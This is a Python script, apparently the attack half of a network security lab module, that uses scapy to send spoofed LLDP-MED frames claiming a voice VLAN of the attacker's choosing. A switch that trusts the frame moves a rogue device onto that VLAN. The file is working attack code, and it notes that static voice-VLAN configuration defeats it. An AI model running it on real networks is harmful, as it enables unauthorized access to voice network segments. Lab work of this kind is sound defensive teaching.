# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-lldp-med: claim a voice VLAN via LLDP-MED. LAB ONLY.

Emits an LLDP frame carrying an LLDP-MED Network Policy TLV (OUI 00-12-bb,
subtype 2) advertising a voice VLAN of the attacker's choosing, so a switch that
honours it places the rogue device on that VLAN. Static voice-VLAN config (see
policy.py) defeats this.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def _tlv(t: int, value: bytes) -> bytes:
    return (((t << 9) | (len(value) & 0x1FF)).to_bytes(2, "big")) + value


def _med_network_policy(vlan: int) -> bytes:
    # org-specific TLV: OUI 00-12-bb, subtype 2 (Network Policy), app=voice(1)
    body = (vlan & 0xFFF) << 9  # VLAN id in bits, L2 prio + DSCP left 0
    payload = bytes([0x00, 0x12, 0xBB, 0x02, 0x01]) + body.to_bytes(3, "big")
    return _tlv(127, payload)


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    mac = s.get_if_hwaddr(args.iface)
    frame = s.Ether(src=mac, dst="01:80:c2:00:00:0e", type=0x88CC) / s.Raw(
        _tlv(1, b"\x04" + bytes.fromhex(mac.replace(":", "")))
        + _tlv(2, b"\x03phone")
        + _tlv(3, (120).to_bytes(2, "big"))
        + _med_network_policy(args.vlan)
        + _tlv(0, b"")
    )
    print(f"[*] advertising voice VLAN {args.vlan} via LLDP-MED on {args.iface}")
    s.sendp(frame, iface=args.iface, count=args.count, verbose=0)
    verdict("ALERT", f"claimed voice VLAN {args.vlan}")
    return 0
